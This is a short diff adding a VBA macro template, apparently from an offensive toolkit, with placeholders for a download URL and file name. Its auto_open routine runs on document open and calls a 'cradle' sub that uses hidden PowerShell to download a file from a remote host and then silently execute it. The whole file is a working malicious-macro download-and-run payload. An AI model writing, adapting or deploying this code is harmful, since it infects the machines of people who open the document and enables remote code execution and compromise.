@@ -1,0 +1,22 @@
+Sub cradle()
+    Dim poshcmd As String
+    poshcmd = "powershell -c (new-object system.net.webclient).downloadfile('[[[[downloadedFrom]]]]','[[[[downloadedAs]]]]')"
+    Shell poshcmd, vbHide
+    Wait (2)
+    Dim runcmd
+    runcmd = "[[[[downloadedAs]]]]"
+    
+    Shell runcmd, vbHide
+End Sub
+
+Sub auto_open()
+    cradle
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
